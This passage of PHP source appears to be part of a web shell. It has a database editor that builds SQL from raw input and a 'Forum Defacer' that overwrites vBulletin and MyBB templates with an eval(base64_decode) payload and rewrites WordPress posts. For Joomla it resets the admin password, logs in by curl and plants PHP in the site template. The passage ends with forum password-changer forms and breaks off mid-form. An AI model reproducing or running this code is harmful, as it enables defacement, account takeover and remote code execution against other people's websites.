			<input type="hidden" name="action" value="editsubmitData">
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
						
			$pResult = mysql_list_fields( $dbname, $tablename );
			$num = mysql_num_fields( $pResult );
	
			$key = "";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				if( $field->primary_key == 1 )
					if( $field->numeric == 1 )
						$key .= $field->name . "=" . $GLOBALS[$field->name] . " AND ";
					else
						$key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
			}
			$key = substr( $key, 0, strlen($key)-4 );
	
			mysql_select_db( $dbname, $mysqlHandle );
			$pResult = mysql_query( $queryStr =  "SELECT * FROM $tablename WHERE $row = $rowid", $mysqlHandle );
			$data = mysql_fetch_array( $pResult );
		
			
			echo "<input type=hidden name=dbname value=$dbname>\n";
			echo "<input type=hidden name=tablename value=$tablename>\n";
			echo "<input type=hidden name=$row value=$rowid>";
			echo "<table cellspacing=1 cellpadding=2 border=1>\n";
			echo "<tr>\n";
			echo "<th>Name</th>\n";
			echo "<th>Type</th>\n";
			echo "<th>Function</th>\n";
			echo "<th>Data</th>\n";
			echo "</tr>\n";
		
			$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
		
			$pResultLen = mysql_list_fields( $dbname, $tablename );
		
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				$fieldname = $field["Field"];
				$fieldtype = $field["Type"];
				$len = mysql_field_len( $pResultLen, $i );
		
				echo "<tr>";
				echo "<td>$fieldname</td>";
				echo "<td>".$field["Type"]."</td>";
				echo "<td>\n";
				echo "<select name=${fieldname}_function class=sbox>\n";
				echo "<option>\n";
				echo "<option>ASCII\n";
				echo "<option>CHAR\n";
				echo "<option>SOUNDEX\n";
				echo "<option>CURDATE\n";
				echo "<option>CURTIME\n";
				echo "<option>FROM_DAYS\n";
				echo "<option>FROM_UNIXTIME\n";
				echo "<option>NOW\n";
				echo "<option>PASSWORD\n";
				echo "<option>PERIOD_ADD\n";
				echo "<option>PERIOD_DIFF\n";
				echo "<option>TO_DAYS\n";
				echo "<option>USER\n";
				echo "<option>WEEKDAY\n";
				echo "<option>RAND\n";
				echo "</select>\n";
				echo "</td>\n";
				$value = htmlspecialchars($data[$i]);
				$type = strtok( $fieldtype, " (,)\n" );
				if( $type == "enum" || $type == "set" ) 
				{
					echo "<td>\n";
					if( $type == "enum" )
						echo "<select name=$fieldname class=box>\n";
					else if( $type == "set" )
						echo "<select name=$fieldname size=4 class=box multiple>\n";
					while( $str = strtok( "'" ) ) 
					{
						if( $value == $str )
							echo "<option selected>$str\n";
						else
							echo "<option>$str\n";
						strtok( "'" );
					}
					echo "</select>\n";
					echo "</td>\n";
					} 
					else 
					{
						if( $len < 40 )
							echo "<td><input type=text size=40 maxlength=$len name=$fieldname value=\"$value\" class=box></td>\n";
						else
							echo "<td><textarea cols=47 rows=3 maxlength=$len name=$fieldname class=box>$value</textarea>\n";
					}
				echo "</tr>";
			}
			echo "</table><p>\n";
			echo "<input type=submit value='Edit Data' class=but>\n";
			echo "<input type=button value='Cancel' onClick='history.back()' class=but>\n";
			echo "</form>\n";
		}
	}

	// Edit Submit Table Data
	else if($_REQUEST['action'] == "editsubmitData")
	{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_POST['dbname'];
			$tablename = $_POST['tablename'];
			
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_POST[$row];
			
			$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
			
			$rowcount = $num;
						
			$pResultLen = mysql_list_fields( $dbname, $tablename );
		
			
						
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				$fieldname = $field["Field"];
				$arrdata = $_REQUEST[$fieldname];
						
				
				$str .= " " . $fieldname . " = '" . $arrdata . "'";
				$rowcount--;
				if($rowcount != 0)
					$str .= ",";
			}
			
			$str = "update $tablename set" . $str . " where $row=$rowid";
			mysql_query($str);
			header("Location:$self?action=viewdata&dbname=$dbname&tablename=$tablename");
	}
	else if(isset($_GET['logoutdb']))
	{
		setcookie("dbserver",time() - 60*60);
		setcookie("dbuser",time() - 60*60);
		setcookie("dbpass",time() - 60*60);
		header("Location:$self?database");
	}
			
	// Forum Manager
	else if(isset($_REQUEST["forum"]))
	{ ?>
		<center><table><tr><td><a href="<?php echo $self; ?>?forum&defaceforum">| Forum Defacer |</a></td>
		<td><a href="<?php echo $self; ?>?forum&passwordchange">| Forum Password Changer |</a></td>
		</tr></table></center><br>
		<?php 
		if(isset($_REQUEST["defaceforum"]))
		{ 
			// Deface Forums
			if(isset($_POST['forumdeface']))
			{
				if($_POST['forumdeface'] == "Hack VB")
				{
					$localhost =  $_POST['f1']; 
					$database =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$index    =  $_POST['index'];
					$prefix    =  $_POST['prefix'];

						$con =@ mysql_connect($localhost,$username,$password); 
						$db =@ mysql_select_db($database,$con);  
						$index=str_replace('"','\\"',$index); 
						$attack  = "{\${eval(base64_decode(\'"; 
						$attack .= base64_encode("echo \"$index\";"); 
						$attack .= "\'))}}{\${exit()}}</textarea>"; 
						if($prefix == "" || $prefix == null)
							$query = "UPDATE template SET template = '$attack'"; 
						else
							$query = "UPDATE ".$prefix."template SET template = '$attack'"; 
						$result =@ mysql_query($query,$con); 
						if($result)
						{ 
							echo "<center><font size=4><blink>Vbulletin Forum Defaced Successfully</blink></font></center>";
						}
						else
						{
							echo "<center><font class=txt size=4><blink>Cannot Deface Vbulletin Forum</blink></font></center>";
						}
				}
				else if($_POST['forumdeface'] == "Hack MyBB")
				{
					$localhost =  $_POST['f1']; 
					$database =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$index    =  $_POST['index'];
					$prefix    =  $_POST['prefix'];
					
						$con =@ mysql_connect($localhost,$username,$password); 
						$db =@ mysql_select_db($database,$con);  
						$attack  = "{\${eval(base64_decode(\'"; 
						$attack .= base64_encode("echo \"$index\";"); 
						$attack .= "\'))}}{\${exit()}}</textarea>"; 
						$attack  = str_replace('"',"\\'",$attack);
					
						if($prefix == "" || $prefix == null)
							$query = "UPDATE mybb_templates SET template = '$attack'"; 
						else
							$query = "UPDATE ".$prefix."templates SET template = '$attack'"; 
						$result =@ mysql_query($query,$con);
						if($result)
						{ 
							echo "<center><font size=4><blink>Mybb Forum Defaced Successfully</blink></font></center>";
						}
						else
						{
							echo "<center><font class=txt size=4><blink>Cannot Deface Mybb Forum</blink></font></center>";
						}
				}
				else if($_POST['forumdeface'] == "Hack SMF")
				{
					$localhost =  $_POST['f1']; 
					$database =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$index    =  $_POST['index'];
					$head    =  $_POST['head'];
					$catid    =  $_POST['f5'];
					$prefix    =  $_POST['prefix'];
					
						$con =@ mysql_connect($localhost,$username,$password); 
						$db =@ mysql_select_db($database,$con);  
						if($prefix == "" || $prefix == null)
							$query = "UPDATE boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
						else
							$query = "UPDATE ".$prefix."boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
						$result =@ mysql_query($query,$con);
						if($result)
						{ 
							echo "<center><font size=4><blink>SMF Forum Index Changed Successfully</blink></font></center>";
						}
						else
						{
							echo "<center><font class=txt size=4><blink>Cannot Deface SMF Forum</blink></font></center>";
						}
				}
				else if($_POST['forumdeface'] == "Hack IPB")
				{
					$localhost =  $_POST['f1']; 
					$database =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$index    =  $_POST['index'];
					$head    =  $_POST['head'];
					$catid    =  $_POST['f5'];
					
						$IPB = "forums";
						$con =@ mysql_connect($localhost,$username,$password); 
						$db =@ mysql_select_db($database,$con);  
						$query = "UPDATE $IPB SET name = '$head', description = '$index' where id = '$catid'"; 
						$result =@ mysql_query($query,$con);
						if($result)
						{ 
							echo "<center><font size=4><blink>Forum Defaced Successfully</blink></font></center>";
						}
						else
						{
							echo "<center><font class=txt size=4><blink>Cannot Deface Forum</blink></font></center>";
						}
				}
				else if($_POST['forumdeface'] == "Hack wordpress")
				{
					$localhost =  $_POST['f1']; 
					$database =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$catid = $_POST['f5'];
					$index    =  $_POST['index'];
					$head    =  $_POST['head'];
					$prefix    =  $_POST['prefix'];
					
						$con =@ mysql_connect($localhost,$username,$password); 
						$db =@ mysql_select_db($database,$con);  
						if($prefix == "" || $prefix == null)
						{
							if(isset($_POST["all"]) && $_POST["all"] == "All")
								$query = "UPDATE wp_posts SET post_title='$head', post_content='$index'"; 
							else
								$query = "UPDATE wp_posts SET post_title='$head', post_content='$index' WHERE ID='$catid'"; 
						}
						else
						{
							if(isset($_POST["all"]) && $_POST["all"] == "All")
								$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index'";
							else
								$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index' WHERE ID='$catid'";
							
						}
						$result =@ mysql_query($query,$con);
						if($result)
						{ 
							echo "<center><font size=4><blink>Wordpress Defaced Successfully</blink></font></center>";
						}
						else
						{
							echo "<center><font class=txt size=4><blink>Cannot Deface Wordpress</blink></font></center>";
						}
				}
				else if($_POST['forumdeface'] == "Hack Joomla")
				{
					$localhost =  $_POST['f1']; 
					$dbname =  $_POST['f2']; 
					$username =  $_POST['f3']; 
					$password =  $_POST['f4']; 
					$dbprefix =  $_POST['prefix'];
					$site_url = $_POST['siteurl'];
					$h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['index']))))."'))); exit; ?>";

					$co=randomt();
					
					$link=mysql_connect("localhost",$username,$password) ;

					mysql_select_db($dbname,$link);
				
				    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
											 
					$req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
						 
					if ( $req )
					{
						$req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
						$data = mysql_fetch_array($req);
						$template_name=$data["template"];
						
						$req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
							 $data = mysql_fetch_array($req);
						$template_id=$data["extension_id"];
						
						$url2=$site_url."/index.php";
						
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 1);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
				
				
						$buffer = curl_exec($ch);
						
						$return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
						$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
				
				
						$url2=$site_url."/index.php";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_POST, 1);
						curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
						
						$pos = strpos($buffer,"com_config");
						if($pos === false) 
						{
							echo("<br>[-] Login Error");
							exit;
						}
										
						$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
				
						$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
						if(!$hidden2) 
						{
							echo("<br>[-] index.php Not found in Theme Editor");
							exit;
						}
						
						$url2=$site_url."/index.php?option=com_templates&layout=edit";
						
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_POST, 1);
						curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
						
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
				
						$pos = strpos($buffer,'<dd class="message message">');
						if($pos === false) 
						{
							echo("<center><font class=txt size=4><blink>Cannot Deface Joomla</blink></font></center>");
							
						}
						else 
						{
							echo("<center><font size=4><blink>Joomla Defaced Successfully</blink></font></center>");
						}
						
					}
					else
					{
						$req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
						$data = mysql_fetch_array($req);
						$template_name=$data["template"];
						
						$url2=$site_url."/index.php";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 1);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
						
						$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
						
						$url2=$site_url."/index.php";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_POST, 1);
						curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
						curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
						
						$pos = strpos($buffer,"com_config");
				
						if($pos === false) 
						{
							echo("<br>[-] Login Error");
							exit;
						}
										
						$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
							curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
							curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
						
						$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
						
						if(!$hidden2) 
						{
							echo("<br>[-] index.php Not found in Theme Editor");
						}
				
						$url2=$site_url."/index.php?option=com_templates&layout=edit";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url2);
						curl_setopt($ch, CURLOPT_POST, 1);
						curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
							curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
							curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
						$buffer = curl_exec($ch);
						
						$pos = strpos($buffer,'<dd class="message message fade">');
						if($pos === false) 
						{
							echo("<center><font class=txt size=4><blink>Cannot Deface Joomla</blink></font></center>");
							exit;
						}
						else 
						{
							echo("<center><font size=4><blink>Joomla Defaced Successfully</blink></font></center>");
						}
					}
				}
			}
		?>
		<center>
			<font class="tblheads" size="4">Vbulletin Forum Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="167" width="780"><p align="center">&nbsp;<textarea class="box" name="index" cols=53 rows=8>lol ! You Are Hacked !!!!</textarea><p align="center"><input type = "submit" class="but" value = "Hack VB" name="forumdeface"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">MyBB Forum Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
					<p>
						Table Prefix : <input type="text" name="prefix" value="mybb_" class="sbox"> (Optional)</td>
					</p>	
					</td>
				</tr>
				<tr>
					<td height="167" width="780"><p align="center">&nbsp;<textarea class="box" name="index" cols=53 rows=8>lol ! You Are Hacked !!!!</textarea><p align="center"><input type = "submit" class="but" value = "Hack MyBB" name="forumdeface"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">SMF Forum Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden" name="forum">
			<input type="hidden" name="defaceforum">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
					<p>
						Table Prefix : <input type="text" name="prefix" value="smf_" class="sbox"> (Optional)</td>
					</p>
					</td>
				</tr>
				<tr>
					<td height="105" width="780"><p align="center"><b>Head : </b><input class="sbox" type="text" name="head" size="20" value="Hacked">&nbsp; <b>Kate ID : </b><input class="sbox" type="text" name="f5" size="20" value="1"></p><p align="center"><textarea name="index" rows="8" cols="53" class="box"><b>lol ! You Are Hacked !!!!</b></textarea></p><input type = "submit" class="but" value = "Hack SMF" name="forumdeface"></p></td>
					
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">IPB Forum Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden" name="forum">
			<input type="hidden" name="defaceforum">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20"></td>
				</tr>
				<tr>
					<td height="167" width="780"><p align="center"><b>Head : </b><input class="sbox" type="text" name="head" size="20" value="Hacked">&nbsp; <b>Kate ID : </b><input class="sbox" type="text" name="f5" size="20" value="1"></p><p align="center">&nbsp;<textarea class="box" name="index" cols=53 rows=8><b>lol ! You Are Hacked !!!!</b></textarea><p align="center"><input type = "submit" class="but" value = "Hack IPB" name="forumdeface"></td>
				</tr>
			</table>
			</form>		
			
			<font class="tblheads" size="4">Wordpress Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden" name="forum">
			<input type="hidden" name="defaceforum">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
					<p>
						Table Prefix : <input type="text" name="prefix" value="wp_" class="sbox"> (Optional)</td>
					</p>
					</td>
				</tr>
				<tr>
					<td height="105" width="780"><p align="center"><b>Head : </b><input class="sbox" type="text" name="head" size="20" value="Hacked">&nbsp; <b>Kate ID : </b><input class="sbox" type="text" name="f5" size="20" value="1">&nbsp;<label><input type="checkbox" name="all" value="All" checked="checked"> All</label><p align="center"><textarea class="box" name="index" rows="8" cols="53"><b>lol ! You Are Hacked !!!!</b></textarea></p>
					<br><input type = "submit" class="but" value = "Hack wordpress" name="forumdeface"></td>
					
				</tr>
			</table>
			</form>
			<font class="tblheads" size="4">Joomla Index Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden" name="forum">
			<input type="hidden" name="defaceforum">
			<table border = "1" width="50%" height="316" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="105" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
					<p>
						Table Prefix : <input type="text" name="prefix" value="jos_" class="sbox"> (Optional)</td>
					</p>
					</td>
				</tr>
				<tr>
					<td height="105" width="780"><p align="center"><b>Site Url : </b><input class="box" type="text" name="siteurl" width="80" value="http://site.com/administrator/"><p align="center"><textarea class="box" name="index" rows="8" cols="53"><b>lol ! You Are Hacked !!!!</b></textarea></p>
					<br><input type = "submit" class="but" value = "Hack Joomla" name="forumdeface"></td>
					
				</tr>
			</table>
			</form>
		</center>	
	<?php 
		}
		else if(isset($_GET["passwordchange"]))
		{
			echo "<center>";
			if(isset($_GET['changed']))
			{	?><font class="txt"><blink>Password Changed Successfully</blink></font><br><br><?php }
			else if(isset($_GET['cannotchange']))
			{	?><blink>Cannot Change Password</blink><br><br> <?php } ?>
			
			<font class="tblheads" size="4">Vbulletin Forum Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden"  name="forums" value="vb">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">MyBB Forum Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST" name="mybb">
			<input type="hidden"  name="forums" value="mybb">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" value="mybb_" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">SMF Forum Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST" name="smf">
			<input type="hidden"  name="forums" value="smf">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" value="smf_" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">Phpbb Forum Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden"  name="forums" value="phpbb">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" value="phpbb_" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			
			<font class="tblheads" size="4">IPB Forum Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST" name="ipb">
			<input type="hidden"  name="forums" value="ipb">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
